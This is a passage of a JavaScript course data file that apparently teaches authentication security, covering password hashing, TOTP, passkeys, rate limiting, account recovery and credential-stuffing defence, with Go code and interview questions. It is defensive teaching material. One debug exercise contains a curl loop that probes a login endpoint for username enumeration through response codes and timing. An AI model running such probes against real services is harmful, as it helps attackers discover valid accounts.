        { q: 'Name the two policy roles defined by NIST SP 800-207 zero trust.', a: 'Policy Decision Point (PDP) which decides, and Policy Enforcement Point (PEP) which enforces the decision on the request path.' },
        { q: 'What does govulncheck do that a plain dependency scanner does not?', a: 'It analyses the call graph and reports only vulnerabilities in functions your code actually reaches, reducing noise.' }
      ],
      resources: [
        { title: 'OWASP Threat Modeling Cheat Sheet', url: 'https://cheatsheetseries.owasp.org/cheatsheets/Threat_Modeling_Cheat_Sheet.html', type: 'docs' },
        { title: 'OWASP Top 10', url: 'https://owasp.org/www-project-top-ten/', type: 'docs' },
        { title: 'OWASP Application Security Verification Standard (ASVS)', url: 'https://owasp.org/www-project-application-security-verification-standard/', type: 'docs' },
        { title: 'OWASP Attack Surface Analysis Cheat Sheet', url: 'https://cheatsheetseries.owasp.org/cheatsheets/Attack_Surface_Analysis_Cheat_Sheet.html', type: 'docs' }
      ]
    },
    // ───────────────────────────────────────────── Module 2 ─────────────────────────────────────────────
    {
      n: 2,
      title: 'Authentication',
      summary: `Proving identity safely: storing passwords with memory-hard hashes, layering MFA (and knowing why SMS and push are weak), moving to phishing-resistant passkeys (WebAuthn/FIDO2), and defending login, recovery and credential-stuffing attack paths at scale.`,
      topics: [
        {
          title: 'Password Storage: bcrypt, scrypt, Argon2id, Salt and Pepper',
          def: `<p>Passwords must be stored with a <strong>slow, salted, adaptive password-hashing function</strong> — never plaintext, never reversible encryption, never a fast hash like SHA-256 (GPUs compute billions per second).</p>
<table>
<thead><tr><th>Algorithm</th><th>Property</th><th>OWASP baseline (2025)</th></tr></thead>
<tbody>
<tr><td><strong>Argon2id</strong> (RFC 9106, preferred)</td><td>memory-hard + time cost, resists GPU/ASIC</td><td>m=19 MiB, t=2, p=1 (or m=46 MiB, t=1)</td></tr>
<tr><td><strong>scrypt</strong></td><td>memory-hard</td><td>N=2^17, r=8, p=1</td></tr>
<tr><td><strong>bcrypt</strong></td><td>CPU-hard, 4 KiB memory</td><td>cost &ge; 10; input truncated at <strong>72 bytes</strong></td></tr>
<tr><td><strong>PBKDF2</strong></td><td>only if FIPS-140 required</td><td>600,000 iterations HMAC-SHA-256</td></tr>
</tbody>
</table>
<ul>
<li><strong>Salt</strong>: unique random value (&ge; 16 bytes) per password, stored with the hash. Defeats rainbow tables and makes identical passwords hash differently. Not secret.</li>
<li><strong>Pepper</strong>: a secret shared across all hashes, stored <em>outside</em> the database (KMS/HSM/secret store). Typically <code>HMAC(pepper, password)</code> before hashing, so a DB-only dump cannot be cracked offline. Plan for pepper rotation (keep a version id).</li>
<li>Store a self-describing <strong>PHC string</strong> (<code>$argon2id$v=19$m=19456,t=2,p=1$salt$hash</code>) so parameters can be raised later; <strong>rehash on successful login</strong> when parameters are outdated.</li>
<li>Compare in constant time (<code>crypto/subtle</code>); bcrypt/argon2 libraries do this.</li>
</ul>
<p>Policy per <strong>NIST SP 800-63B (rev. 4, 2025)</strong>: minimum 15 characters for password-only accounts (8 when used with MFA), allow at least 64 characters and paste/password managers, <strong>no composition rules</strong>, <strong>no periodic forced rotation</strong> (only on evidence of compromise), and block known-breached and common passwords.</p>`,
          interview: 'Know the ranking (Argon2id > scrypt > bcrypt > PBKDF2-for-FIPS), why fast hashes are wrong, salt vs pepper, the bcrypt 72-byte truncation gotcha, rehash-on-login for parameter upgrades, and that hashing cost is a DoS vector, so rate limit before hashing.',
          examples: [
            {
              label: 'Argon2id with PHC encoding (golang.org/x/crypto/argon2)',
              lang: 'go',
              code: `type params struct{ mem uint32; time uint32; threads uint8; keyLen uint32 }

var current = params{mem: 19 * 1024, time: 2, threads: 1, keyLen: 32} // OWASP baseline

func Hash(password string) (string, error) {
    salt := make([]byte, 16)
    rand.Read(salt) // crypto/rand; never fails as of Go 1.24
    key := argon2.IDKey([]byte(password), salt, current.time, current.mem, current.threads, current.keyLen)
    return fmt.Sprintf("$argon2id$v=%d$m=%d,t=%d,p=%d$%s$%s",
        argon2.Version, current.mem, current.time, current.threads,
        base64.RawStdEncoding.EncodeToString(salt),
        base64.RawStdEncoding.EncodeToString(key)), nil
}

func Verify(password, encoded string) (ok, needsRehash bool, err error) {
    var p params
    var version int
    parts := strings.Split(encoded, "$") // ["", "argon2id", "v=19", "m=..,t=..,p=..", salt, hash]
    if len(parts) != 6 || parts[1] != "argon2id" {
        return false, false, errors.New("unsupported hash")
    }
    if _, err := fmt.Sscanf(parts[2], "v=%d", &version); err != nil || version != argon2.Version {
        return false, false, errors.New("unsupported argon2 version")
    }
    if _, err := fmt.Sscanf(parts[3], "m=%d,t=%d,p=%d", &p.mem, &p.time, &p.threads); err != nil ||
        p.time < 1 || p.threads < 1 || p.mem < 8*uint32(p.threads) || p.mem > 1<<20 { // argon2 panics on 0; cap at 1 GiB
        return false, false, errors.New("invalid argon2 parameters")
    }
    salt, err := base64.RawStdEncoding.DecodeString(parts[4])
    if err != nil || len(salt) < 8 {
        return false, false, errors.New("invalid salt")
    }
    want, err := base64.RawStdEncoding.DecodeString(parts[5])
    if err != nil || len(want) < 16 {
        return false, false, errors.New("invalid hash")
    }
    got := argon2.IDKey([]byte(password), salt, p.time, p.mem, p.threads, uint32(len(want)))
    ok = subtle.ConstantTimeCompare(got, want) == 1
    needsRehash = ok && (p.mem < current.mem || p.time < current.time)
    return ok, needsRehash, nil
}`
            }
          ]
        },
        {
          title: 'Multi-Factor Authentication: TOTP, Push, SMS and Phishing Resistance',
          def: `<p>MFA combines factors from different categories: <strong>something you know</strong> (password, PIN), <strong>something you have</strong> (phone, security key), <strong>something you are</strong> (biometric, usually unlocking a local key). Two passwords are not MFA.</p>
<p><strong>TOTP</strong> (RFC 6238, built on HOTP RFC 4226): server and app share a secret (provisioned via QR code <code>otpauth://</code> URI). Code = HMAC-SHA1(secret, floor(unixTime / 30)) &rarr; dynamic truncation &rarr; 6 digits. Server accepts a small window (&plusmn;1 step) for clock skew and must <strong>reject reuse</strong> of an already-accepted step. The shared secret must be encrypted at rest.</p>
<table>
<thead><tr><th>Method</th><th>Strengths</th><th>Weaknesses</th></tr></thead>
<tbody>
<tr><td>SMS / voice OTP</td><td>universal</td><td>SIM swap, SS7 interception, phishable; NIST "restricted" authenticator</td></tr>
<tr><td>TOTP app</td><td>offline, cheap</td><td>phishable in real time (adversary-in-the-middle proxies such as Evilginx)</td></tr>
<tr><td>Push approval</td><td>good UX</td><td><strong>MFA fatigue</strong>/push bombing; mitigate with number matching + context (app, location)</td></tr>
<tr><td>FIDO2 / passkeys, smart cards</td><td><strong>phishing-resistant</strong> (origin-bound), no shared secret</td><td>recovery and device management</td></tr>
</tbody>
</table>
<p>Adversary-in-the-middle phishing relays the password and the OTP and steals the resulting <em>session cookie</em> — so only origin-bound authenticators (WebAuthn) truly stop it, and session binding / short sessions limit damage. Offer <strong>step-up authentication</strong> for sensitive actions (change email, add payee) and provide one-time <strong>recovery codes</strong> (hashed like passwords).</p>`,
          interview: 'Expect to explain how TOTP works internally, why SMS is weak (SIM swap), what MFA fatigue is and how number matching mitigates it, and why only WebAuthn/FIDO2 is phishing-resistant: real-time AiTM proxies relay any code the user can type.',
          examples: [
            {
              label: 'TOTP provisioning URI (rendered as QR code)',
              lang: 'text',
              code: `otpauth://totp/Acme:alice@example.com?secret=JBSWY3DPEHPK3PXP&issuer=Acme&algorithm=SHA1&digits=6&period=30

secret  = base32-encoded random 160-bit key (generate with crypto/rand, store encrypted)
counter = floor(unix_time / 30)
code    = truncate(HMAC-SHA1(secret, counter)) mod 10^6`
            }
          ]
        },
        {
          title: 'Passkeys, WebAuthn and FIDO2',
          def: `<p><strong>FIDO2</strong> = W3C <strong>WebAuthn</strong> (browser API) + <strong>CTAP2</strong> (browser &harr; authenticator protocol). A <strong>passkey</strong> is a discoverable FIDO credential: a per-site key pair whose private key never leaves the authenticator (platform authenticator like iCloud Keychain / Google Password Manager / Windows Hello, or a hardware key). <em>Synced</em> passkeys are backed up across a user's devices; <em>device-bound</em> passkeys (security keys) are not.</p>
<p><strong>Registration ceremony</strong>:</p>
<ol>
<li>Server creates a random <strong>challenge</strong> and options: relying party id (<code>rp.id = example.com</code>), opaque user handle, allowed algorithms (ES256 = -7, EdDSA = -8, RS256 = -257), <code>residentKey: required</code>, <code>userVerification</code>.</li>
<li>Browser calls <code>navigator.credentials.create()</code>; the authenticator verifies the user (biometric/PIN) and generates a new key pair scoped to the rp id.</li>
<li>Browser returns credential id, public key, attestation and <code>clientDataJSON</code> (type, challenge, <strong>origin</strong>).</li>
<li>Server verifies challenge, origin, <code>rpIdHash</code>, flags (UP user present, UV user verified, BE/BS backup eligibility/state) and stores credential id + public key + sign count.</li>
</ol>
<p><strong>Authentication ceremony</strong>:</p>
<ol>
<li>Server sends a fresh challenge (empty <code>allowCredentials</code> enables usernameless login and <em>conditional UI</em> autofill).</li>
<li><code>navigator.credentials.get()</code>: the browser only offers credentials for the current origin's rp id; the authenticator signs <code>authenticatorData || SHA-256(clientDataJSON)</code>.</li>
<li>Server verifies the signature with the stored public key, plus challenge, origin, rp id hash, UV flag and sign counter.</li>
</ol>
<p><strong>Why phishing-resistant</strong>: the browser, not the user, binds the credential to the origin — <code>examp1e.com</code> cannot obtain a signature for <code>example.com</code>. The server stores only public keys, so a DB breach leaks nothing replayable, and there is nothing for users to type or reuse. NIST SP 800-63B rev. 4 accepts synced passkeys at AAL2.</p>
<p><strong>Operational details interviewers probe</strong>:</p>
<ul>
<li><strong>Sign counter</strong>: synced passkeys usually report <code>signCount = 0</code> forever. Treat the counter as a clone signal only when it is non-zero and goes backwards; never reject logins because it stays 0.</li>
<li><strong>Backup flags</strong> (BE/BS) tell you whether a credential is synced. Policy can require device-bound keys (security keys, optionally with attestation and an AAGUID allow-list) for admins while accepting synced passkeys for customers.</li>
<li><strong>Cross-device sign-in</strong> (hybrid transport: QR code + Bluetooth proximity) keeps phishing resistance because the phone checks that the computer is physically nearby.</li>
<li><strong>Related origins</strong>: one passkey can be used across several domains (<code>example.com</code>, <code>example.co.uk</code>) via a <code>/.well-known/webauthn</code> list; otherwise choose <code>rp.id</code> carefully because it cannot change later.</li>
<li><strong>Signals API</strong> (WebAuthn Level 3): the RP can tell the passkey provider that a credential was deleted or the username changed, so stale passkeys stop appearing in autofill.</li>
</ul>
<p><strong>Account recovery with passkeys</strong>: the platform (iCloud Keychain, Google Password Manager) recovers <em>synced</em> passkeys itself, but your app still needs a path for users who lose every authenticator. Encourage at least two passkeys (for example synced + hardware key), offer one-time recovery codes, and treat anything weaker (email or SMS reset) as a high-risk flow with step-up, a cooling-off delay and notifications — the weakest recovery path is your real security level, and an SMS reset that bypasses passkeys reintroduces phishing.</p>`,
          interview: 'Walk through both ceremonies, name what the server must verify (challenge, origin, rpIdHash, flags, signature, counter), explain origin binding as the reason for phishing resistance, and discuss synced vs device-bound passkeys and account recovery trade-offs.',
          examples: [
            {
              label: 'Decoded clientDataJSON from an authentication assertion',
              lang: 'json',
              code: `{
  "type": "webauthn.get",
  "challenge": "q3Vt9n1x0cY1N8M2v0JcVw",      // must equal the server-issued challenge (single use)
  "origin": "https://login.example.com",     // must be in the server's allow-list
  "crossOrigin": false
}`
            }
          ]
        },
        {
          title: 'Brute-Force Protection and Account Recovery',
          def: `<p><strong>Online guessing</strong> comes in three shapes: brute force (many passwords, one account), <strong>password spraying</strong> (one common password, many accounts) and <strong>credential stuffing</strong> (leaked pairs from other sites). Controls must cover all three:</p>
<ul>
<li><strong>Rate limit by several keys</strong>: per account, per IP / subnet / ASN, and globally on failure ratio. Use exponential backoff or progressive delays.</li>
<li>Prefer <strong>soft lockout</strong> (CAPTCHA, step-up, temporary delay) over hard lockout — hard lockout lets attackers lock out any user (a DoS).</li>
<li><strong>Uniform responses</strong>: "Invalid username or password" for both cases, with similar timing (hash a dummy value when the user does not exist) to avoid user enumeration. Same for registration and reset ("if the account exists...").</li>
<li>Rate-limit <em>before</em> the expensive password hash so Argon2 itself is not a CPU DoS vector.</li>
<li>Notify users of new-device sign-ins and password/MFA changes.</li>
</ul>
<p><strong>Account recovery</strong> is often the weakest path — attackers bypass strong MFA through support desks and email resets.</p>
<ol>
<li>Reset tokens: &ge; 128 bits from a CSPRNG, store only their hash, single use, short TTL (15–60 min), bound to the account.</li>
<li>Build reset links from configured base URLs (never the <code>Host</code> header) and set <code>Referrer-Policy: no-referrer</code>.</li>
<li>If MFA is enabled, recovery must require a second factor or recovery code — otherwise email becomes the real security level.</li>
<li>After reset: revoke all sessions and refresh tokens, notify via all channels.</li>
<li>High-assurance recovery (lost all factors): identity proofing and a cooling-off delay with notifications.</li>
</ol>`,
          interview: 'Interviewers look for multi-key rate limiting, why hard lockouts are a DoS, enumeration via response content AND timing, and recovery as the bypass of MFA. Mention revoking sessions after a password reset.',
          examples: [
            {
              label: 'Constant-ish timing when the user does not exist',
              lang: 'go',
              code: `var dummyHash, _ = Hash("dummy-password-for-timing") // computed once at startup

func (s *Service) Login(ctx context.Context, email, password string) (*User, error) {
    u, err := s.users.ByEmail(ctx, email)
    if err != nil {
        Verify(password, dummyHash) // spend the same time as a real check
        return nil, ErrInvalidCredentials
    }
    ok, rehash, _ := Verify(password, u.PasswordHash)
    if !ok {
        return nil, ErrInvalidCredentials // identical error for both cases
    }
    if rehash {
        if h, err := Hash(password); err == nil {
            s.users.UpdateHash(ctx, u.ID, h) // transparent parameter upgrade
        }
    }
    return u, nil
}`
            }
          ]
        },
        {
          title: 'Credential Stuffing and Risk-Based Authentication',
          def: `<p>Credential stuffing replays username/password pairs leaked from other breaches. Bots rotate through residential proxies, so per-IP limits alone fail. Layered defenses (OWASP Credential Stuffing Prevention):</p>
<ul>
<li><strong>MFA / passkeys</strong> — the single most effective control; passkeys remove the reusable secret entirely.</li>
<li><strong>Breached-password screening</strong> at registration and login, e.g. Have I Been Pwned's <em>k-anonymity</em> range API: send only the first 5 hex chars of SHA-1(password), compare suffixes locally — the service never learns the password.</li>
<li><strong>Bot and automation detection</strong>: device/browser fingerprinting, TLS fingerprints (JA3/JA4), behavioral signals, invisible challenges; CAPTCHA as a last resort.</li>
<li><strong>Risk-based (adaptive) authentication</strong>: score each attempt on new device, impossible travel, IP reputation, ASN, time of day; step up to MFA or block when risky.</li>
<li><strong>Monitoring</strong>: login failure ratio, many accounts per IP or device, spikes from new ASNs; alert and auto-throttle.</li>
<li><strong>Response</strong>: force reset for confirmed compromised accounts, revoke sessions, notify users.</li>
</ul>
<p>Architecturally, login should run behind an edge with bot management, and the auth service should expose metrics for success/failure per dimension so attacks are visible within minutes.</p>`,
          interview: 'Distinguish brute force, spraying and stuffing; explain the k-anonymity range API; and present a layered plan (MFA/passkeys, breached-password checks, bot detection, risk scoring, monitoring) rather than "add a CAPTCHA".',
          examples: [
            {
              label: 'k-anonymity range query (only a 5-char prefix leaves your server)',
              lang: 'http',
              code: `GET /range/5BAA6 HTTP/1.1          (SHA-1("password") = 5BAA61E4C9B93F3F0682250B6CF8331B7EE68FD8)
Host: api.pwnedpasswords.com
Add-Padding: true

HTTP/1.1 200 OK
Content-Type: text/plain

0018A45C4D1DEF81644B54AB7F969B88D65:10
1E4C9B93F3F0682250B6CF8331B7EE68FD8:52579654     <- suffix match: breached ~52M times, reject
...`
            }
          ]
        }
      ],
      problems: [
        {
          t: 'Hash and verify passwords with bcrypt in Go',
          d: 'easy',
          type: 'coding',
          hint: `<ul><li>Use <code>golang.org/x/crypto/bcrypt</code>: <code>GenerateFromPassword</code> and <code>CompareHashAndPassword</code>.</li><li>Cost &ge; 10 (benchmark ~100–250 ms on your hardware).</li><li>bcrypt rejects passwords over 72 bytes in Go (<code>ErrPasswordTooLong</code>) — decide: limit length or pre-hash with HMAC.</li></ul>`,
          solution: `import "golang.org/x/crypto/bcrypt"

const cost = 12

func HashPassword(pw string) (string, error) {
    if len(pw) > 72 {
        return "", errors.New("password too long for bcrypt; use argon2id or pre-hash")
    }
    b, err := bcrypt.GenerateFromPassword([]byte(pw), cost) // salt generated and embedded
    return string(b), err                                    // "$2a$12$<22-char salt><31-char hash>"
}

func CheckPassword(hash, pw string) bool {
    return bcrypt.CompareHashAndPassword([]byte(hash), []byte(pw)) == nil // constant-time
}

func NeedsRehash(hash string) bool {
    c, err := bcrypt.Cost([]byte(hash))
    return err != nil || c < cost
}`,
          lang: 'go'
        },
        {
          t: 'Explain salt vs pepper and implement a peppered hash',
          d: 'easy',
          type: 'concept',
          hint: `<ul><li>Salt: per-user, random, public, stored with the hash.</li><li>Pepper: global secret, kept outside the DB (KMS, secret store), versioned.</li><li>Apply as <code>HMAC-SHA256(pepper, password)</code> and feed the result to Argon2id.</li></ul>`,
          solution: `// pepper loaded at startup from a secret manager; version stored with each hash for rotation
func peppered(pepper []byte, pw string) []byte {
    m := hmac.New(sha256.New, pepper)
    m.Write([]byte(pw))
    return m.Sum(nil) // 32 bytes -> also sidesteps bcrypt's 72-byte limit (base64 it first for bcrypt)
}

// stored record: {pepper_version: 3, hash: "$argon2id$v=19$m=19456,t=2,p=1$..."}
// Rotation: on login with old pepper_version, verify with old pepper, rehash with new one.`,
          lang: 'go'
        },
        {
          t: 'Implement TOTP (RFC 6238) verification with replay protection',
          d: 'medium',
          type: 'coding',
          hint: `<ul><li>counter = unixTime / 30, 8-byte big-endian, HMAC-SHA1 with the secret.</li><li>Dynamic truncation: offset = last byte &amp; 0x0f, take 31 bits at offset, mod 10^6.</li><li>Accept steps -1, 0, +1; store the last accepted step and reject anything &lt;= it.</li><li>Compare with <code>subtle.ConstantTimeCompare</code>.</li></ul>`,
          solution: `func hotp(secret []byte, counter uint64) string {
    var msg [8]byte
    binary.BigEndian.PutUint64(msg[:], counter)
    m := hmac.New(sha1.New, secret)
    m.Write(msg[:])
    sum := m.Sum(nil)
    off := sum[len(sum)-1] & 0x0f
    bin := (uint32(sum[off])&0x7f)<<24 | uint32(sum[off+1])<<16 | uint32(sum[off+2])<<8 | uint32(sum[off+3])
    return fmt.Sprintf("%06d", bin%1_000_000)
}

// Verify checks code against the current step +/- 1 and enforces single use.
func Verify(secret []byte, code string, now time.Time, lastStep int64) (ok bool, newLast int64) {
    cur := now.Unix() / 30
    for _, d := range []int64{-1, 0, 1} {
        step := cur + d
        if step <= lastStep {
            continue // already used (replay) or older
        }
        if subtle.ConstantTimeCompare([]byte(hotp(secret, uint64(step))), []byte(code)) == 1 {
            return true, step // persist newLast atomically with the login
        }
    }
    return false, lastStep
}

// RFC 6238 test vector (SHA1, secret "12345678901234567890", T=59s) -> "94287082" for 8 digits.`,
          lang: 'go'
        },
        {
          t: 'Find and fix username enumeration in a login API',
          d: 'medium',
          type: 'debug',
          hint: `<ul><li>Compare responses for "unknown user" vs "wrong password": status, body, headers, <em>and latency</em>.</li><li>Unknown users skip the slow hash &rarr; measurable timing difference.</li><li>Check registration ("email already taken") and reset flows too.</li></ul>`,
          solution: `# Reproduce
for u in alice@example.com nobody-xyz@example.com; do
  curl -s -o /dev/null -w "$u %{http_code} %{time_total}s\\n" \\
    -H 'Content-Type: application/json' -d "{\\"email\\":\\"$u\\",\\"password\\":\\"wrong\\"}" \\
    https://staging.example.com/api/login
done
# alice@example.com 401 0.212s     <- hashed
# nobody-xyz@example.com 404 0.004s <- different status AND ~50x faster => enumeration

Fix:
1. Same status (401) and same body {"error":"invalid_credentials"} for both.
2. Verify against a precomputed dummy hash when the user does not exist.
3. Registration: accept the request and send an email ("you already have an account") instead of an inline error.
4. Rate-limit by IP and by target account; alert on many distinct usernames from one client.`,
          lang: 'bash'
        },
        {
          t: 'Implement login rate limiting per account and per IP',
          d: 'medium',
          type: 'coding',
          hint: `<ul><li>Two token buckets: key <code>ip:1.2.3.4</code> and <code>acct:alice</code>; both must allow.</li><li>Check <em>before</em> the password hash.</li><li>Return 429 with <code>Retry-After</code>; for multiple replicas use Redis (atomic INCR + EXPIRE or a Lua sliding window).</li><li>Evict idle limiters to bound memory.</li></ul>`,
          solution: `type keyedLimiter struct {
    mu      sync.Mutex
    buckets map[string]*entry
    r       rate.Limit
    burst   int
}
type entry struct{ lim *rate.Limiter; seen time.Time }

func newKeyed(r rate.Limit, burst int) *keyedLimiter {
    k := &keyedLimiter{buckets: map[string]*entry{}, r: r, burst: burst}
    go k.gc()
    return k
}

func (k *keyedLimiter) Allow(key string) bool {
    k.mu.Lock()
    defer k.mu.Unlock()
    e, ok := k.buckets[key]
    if !ok {
        e = &entry{lim: rate.NewLimiter(k.r, k.burst)}
        k.buckets[key] = e
    }
    e.seen = time.Now()
    return e.lim.Allow()
}

func (k *keyedLimiter) gc() {
    for range time.Tick(time.Minute) {
        k.mu.Lock()
        for key, e := range k.buckets {
            if time.Since(e.seen) > 10*time.Minute {
                delete(k.buckets, key)
            }
        }
        k.mu.Unlock()
    }
}

var (
    perIP   = newKeyed(rate.Every(2*time.Second), 10) // ~30/min, burst 10
    perAcct = newKeyed(rate.Every(time.Minute), 5)    // 5 quick tries, then 1/min
)

func (h *Handler) Login(w http.ResponseWriter, r *http.Request) {
    var req struct{ Email, Password string }
    if err := json.NewDecoder(http.MaxBytesReader(w, r.Body, 4096)).Decode(&req); err != nil {
        http.Error(w, "bad request", http.StatusBadRequest)
        return
    }
    ip := clientIP(r) // from trusted proxy header config only
    if !perIP.Allow("ip:"+ip) || !perAcct.Allow("acct:"+strings.ToLower(req.Email)) {
        w.Header().Set("Retry-After", "60")
        http.Error(w, "too many attempts", http.StatusTooManyRequests)
        return
    }
    // ... only now run the expensive password verification
}`,
          lang: 'go'
        },
        {
          t: 'Block breached passwords with the k-anonymity range API',
          d: 'medium',
          type: 'coding',
          hint: `<ul><li>SHA-1 the password, uppercase hex; send the first 5 chars to <code>/range/{prefix}</code>.</li><li>Response lines are <code>SUFFIX:COUNT</code>; match the remaining 35 chars locally.</li><li>Use a timeout and decide fail-open vs fail-closed for availability (usually fail-open with logging for this check).</li></ul>`,
          solution: `func BreachCount(ctx context.Context, pw string) (int, error) {
    sum := sha1.Sum([]byte(pw))
    h := strings.ToUpper(hex.EncodeToString(sum[:]))
    prefix, suffix := h[:5], h[5:]

    ctx, cancel := context.WithTimeout(ctx, 2*time.Second)
    defer cancel()
    req, _ := http.NewRequestWithContext(ctx, http.MethodGet, "https://api.pwnedpasswords.com/range/"+prefix, nil)
    req.Header.Set("Add-Padding", "true") // hides response size
    res, err := http.DefaultClient.Do(req)
    if err != nil {
        return 0, err
    }
    defer res.Body.Close()

    sc := bufio.NewScanner(res.Body)
    for sc.Scan() {
        s, c, ok := strings.Cut(strings.TrimSpace(sc.Text()), ":")
        if ok && s == suffix {
            n, _ := strconv.Atoi(c)
            return n, nil // padding rows have count 0
        }
    }
    return 0, sc.Err()
}`,
          lang: 'go'
        },
        {
          t: 'Design a secure account recovery flow for MFA-enabled users',
          d: 'hard',
          type: 'design',
          hint: `<ul><li>Recovery must not be weaker than login — otherwise it is the real authentication method.</li><li>Tiered: recovery codes &rarr; second registered passkey &rarr; verified email + delay &rarr; manual identity proofing.</li><li>Notifications, cooling-off period, session revocation, support-desk scripts resistant to social engineering.</li></ul>`,
          solution: `Tier 1  Another registered factor (2nd passkey, security key, TOTP)            -> immediate
Tier 2  One-time recovery code (10 codes, each hashed with argon2id, single use) -> immediate, notify
Tier 3  Email link (128-bit token, SHA-256 stored, 30 min TTL, single use)
        + 24-72h cooling-off delay; notifications to all channels with "this wasn't me" cancel link
Tier 4  Support-desk / identity proofing (document + liveness) for high-value accounts; no
        recovery based on public info (DOB, address)

After any recovery:
- revoke all sessions + refresh tokens, require re-enrolment of a new factor
- audit log + risk signal (new device, new country) -> extra delay
- rate limit recovery attempts per account and per IP
Anti-patterns: SMS-only recovery for MFA accounts, security questions, reset link built from Host header.`,
          lang: 'text'
        },
        {
          t: 'Plan a passkey rollout for an existing password-based application',
          d: 'hard',
          type: 'design',
          hint: `<ul><li>Use a maintained library (<code>github.com/go-webauthn/webauthn</code>) — do not hand-roll CBOR/COSE parsing.</li><li>Data model: many credentials per user (id, public key, sign count, transports, backup flags, name, last used).</li><li>UX: enrol after login ("create a passkey"), conditional UI autofill, keep password as fallback initially.</li><li>Decide <code>rp.id</code> carefully (registrable domain shared by subdomains) — it cannot change later without re-enrolment.</li></ul>`,
          solution: `Phase 1  Backend: WebAuthn endpoints
         POST /webauthn/register/begin   -> creation options (challenge stored server-side, 5 min TTL)
         POST /webauthn/register/finish  -> verify origin, rpIdHash, challenge, attestation(none ok), store credential
         POST /webauthn/login/begin      -> request options (empty allowCredentials for discoverable creds)
         POST /webauthn/login/finish     -> verify signature, UV flag, counter; create session (rotate id)
         rp.id = "example.com"; allowed origins = https://example.com, https://app.example.com
Phase 2  Opt-in enrolment prompts after password+MFA login; account page lists/renames/revokes passkeys
Phase 3  Conditional UI (autocomplete="username webauthn") so passkeys appear in autofill
Phase 4  Passkey counts as MFA (UV=true); stop prompting for TOTP when used
Phase 5  For admins/high-risk: require passkeys/security keys; optionally remove passwords
Recovery: require at least two passkeys (synced passkey + hardware key) or recovery codes
Metrics: enrolment rate, passkey sign-in share, fallback usage, recovery volume`,
          lang: 'text'
        },
        {
          t: 'Respond to a live credential-stuffing attack',
          d: 'hard',
          type: 'design',
          hint: `<ul><li>Detect: login failure ratio spike, many usernames per device/IP, new ASNs, high success on dormant accounts.</li><li>Contain: edge bot rules, progressive challenges, step-up MFA for risky logins, temporary block lists.</li><li>Remediate: force reset and revoke sessions for accounts with successful suspicious logins; notify users.</li><li>Prevent: breached-password checks, passkeys, risk-based auth.</li></ul>`,
          solution: `Detection signals (dashboards + alerts):
  failed_logins / total_logins > baseline x5; distinct usernames per IP/ASN/JA4; successful logins from new devices on dormant accounts
Immediate containment (minutes):
  - WAF/bot manager: challenge or block offending ASNs, JA4 fingerprints, headless signatures
  - Tighten per-account and global rate limits; enable CAPTCHA for unknown devices
  - Risk engine: require MFA step-up for all new-device logins during the incident
Account remediation (hours):
  - Identify accounts with successful logins matching attack fingerprints
  - Revoke their sessions/refresh tokens, force password reset, notify users
  - Check for post-login abuse (changed email/payout details) and roll back
Hardening (weeks):
  - Breached-password check at login and registration; passkeys; device-binding of sessions
  - Login telemetry with per-dimension metrics; runbook + game day`,
          lang: 'text'
        }
      ],
      interviewFocus: [
        {
          q: 'How should a service store user passwords, and why?',
          a: `<p>Use a <strong>slow, salted, memory-hard password hash</strong> — Argon2id (m=19 MiB, t=2, p=1 as a baseline), or scrypt/bcrypt; PBKDF2 with 600k iterations only when FIPS is required.</p>
<ul>
<li><strong>Why slow</strong>: offline attackers with a DB dump run GPU rigs; SHA-256 at billions/sec makes most human passwords crackable in hours. Argon2id's memory cost makes GPU/ASIC parallelism expensive.</li>
<li><strong>Salt</strong> per password (16+ random bytes) defeats precomputed tables and hides duplicate passwords.</li>
<li><strong>Pepper</strong> (HMAC with a key in KMS/HSM) means a DB-only leak is not enough to crack.</li>
<li>Store a PHC string with parameters; <strong>rehash on login</strong> when parameters increase.</li>
<li>Constant-time comparison; rate limiting before hashing to avoid CPU DoS; cap input length (bcrypt truncates at 72 bytes).</li>
</ul>
<p>Policy per NIST 800-63B rev. 4: long passwords, no composition or rotation rules, breached-password blocklist, allow password managers. Then explain that the real fix is moving users to passkeys so there is no shared secret to steal.</p>`
        },
        {
          q: 'Why are passkeys phishing-resistant when TOTP codes are not?',
          a: `<p>With TOTP the user is the transport: they read a code and type it anywhere. An adversary-in-the-middle proxy (e.g. on <code>examp1e-login.com</code>) relays the password and code to the real site in real time and steals the session cookie.</p>
<p>With WebAuthn the <strong>browser</strong> enforces origin binding:</p>
<ol>
<li>Credentials are scoped to an <code>rp.id</code> (e.g. <code>example.com</code>); the browser refuses to use them on any other origin.</li>
<li>The signed data includes <code>clientDataJSON</code> with the actual <code>origin</code> and the server's one-time challenge, and <code>authenticatorData</code> with the rp id hash; the server verifies all of them.</li>
<li>A phishing page can only ask for a credential for its own domain — which the user doesn't have.</li>
</ol>
<p>Additionally the server stores only public keys (a breach yields nothing replayable), the private key never leaves the authenticator, and user verification (biometric/PIN) happens locally. Residual risks: account recovery paths, session-cookie theft by malware after login, and downgrade if weaker factors stay enabled.</p>`
        },
        {
          q: 'How would you defend a consumer login endpoint against credential stuffing at scale?',
          a: `<p>Layered, because attackers use millions of residential IPs:</p>
<ul>
<li><strong>Edge</strong>: bot management (TLS/JA4 fingerprints, headless detection, behavioral signals), WAF rules, invisible challenges.</li>
<li><strong>Rate limiting</strong> on multiple keys: account, IP, subnet/ASN, device fingerprint, and global failure ratio. Soft lockouts, not hard ones.</li>
<li><strong>Breached-password screening</strong> (k-anonymity) at registration, password change and login.</li>
<li><strong>Risk-based authentication</strong>: new device, impossible travel, bad IP reputation &rarr; step-up MFA.</li>
<li><strong>MFA and passkeys</strong> — make the leaked password insufficient.</li>
<li><strong>Uniform errors</strong> to prevent the attacker from validating usernames.</li>
<li><strong>Detection and response</strong>: dashboards on failure ratios, alerts, automatic forced resets and session revocation for compromised accounts, user notifications.</li>
</ul>
<p>I would also measure: attack success rate, false-positive challenge rate for real users, and time to detect.</p>`
        },
        {
          q: 'Compare SMS OTP, TOTP, push and FIDO2 as second factors.',
          a: `<table>
<thead><tr><th>Factor</th><th>Main attacks</th><th>Verdict</th></tr></thead>
<tbody>
<tr><td>SMS OTP</td><td>SIM swap, SS7/telecom interception, real-time phishing, malware reading SMS</td><td>Better than nothing; NIST "restricted"; avoid for high-value accounts</td></tr>
<tr><td>TOTP</td><td>real-time phishing relay, seed theft from server DB</td><td>Good baseline; encrypt seeds; reject code reuse</td></tr>
<tr><td>Push</td><td>MFA fatigue / push bombing, phishing relay</td><td>Use number matching, context and rate limits on prompts</td></tr>
<tr><td>FIDO2 / passkeys</td><td>recovery-path attacks, post-auth session theft</td><td>Phishing-resistant; preferred, mandatory for admins</td></tr>
</tbody>
